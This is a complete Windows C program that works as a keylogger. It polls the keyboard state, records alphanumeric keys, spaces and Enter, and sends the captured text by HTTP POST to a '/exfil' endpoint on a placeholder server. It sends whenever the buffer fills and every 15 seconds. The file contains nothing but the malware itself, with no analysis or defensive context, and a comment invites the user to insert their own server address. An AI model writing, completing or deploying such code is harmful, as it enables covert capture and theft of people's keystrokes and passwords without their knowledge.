#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

#define SERVER "your.server.ip" // Use IP or plain domain (no https)
#define PORT 80
#define LOG_BUFFER_SIZE 1024

void exfiltrate_data(const char *data) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char message[2048], response[4096];

    // Compose HTTP POST
    sprintf(message,
        "POST /exfil HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: %d\r\n\r\n"
        "data=%s",
        SERVER, (int)(strlen(data) + 5), data);

    WSAStartup(MAKEWORD(2,2), &wsa);
    s = socket(AF_INET, SOCK_STREAM, 0);

    server.sin_addr.s_addr = inet_addr(SERVER);
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);

    if (connect(s, (struct sockaddr *)&server, sizeof(server)) == 0) {
        send(s, message, (int)strlen(message), 0);
        recv(s, response, sizeof(response), 0);
    }
    closesocket(s);
    WSACleanup();
}

int main(void) {
    char log_buffer[LOG_BUFFER_SIZE] = {0};
    int log_index = 0;
    char key;
    DWORD last_exfil = GetTickCount();

    while (1) {
        for (key = 8; key <= 222; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                // Alphanumeric and some punctuation
                if ((key >= 39 && key <= 64) || (key >= 65 && key <= 90) || (key >= 97 && key <= 122)) {
                    log_buffer[log_index++] = key;
                } else if (key == VK_SPACE) {
                    log_buffer[log_index++] = ' ';
                } else if (key == VK_RETURN) {
                    log_buffer[log_index++] = '\n';
                }
                // If buffer is nearly full, exfiltrate
                if (log_index >= LOG_BUFFER_SIZE - 2) {
                    log_buffer[log_index] = '\0';
                    exfiltrate_data(log_buffer);
                    log_index = 0;
                    memset(log_buffer, 0, LOG_BUFFER_SIZE);
                    last_exfil = GetTickCount();
                }
            }
        }
        // Exfiltrate every 15 seconds even if buffer isn't full
        if (log_index > 0 && (GetTickCount() - last_exfil > 15000)) {
            log_buffer[log_index] = '\0';
            exfiltrate_data(log_buffer);
            log_index = 0;
            memset(log_buffer, 0, LOG_BUFFER_SIZE);
            last_exfil = GetTickCount();
        }
        Sleep(10);
    }
    return 0;
}
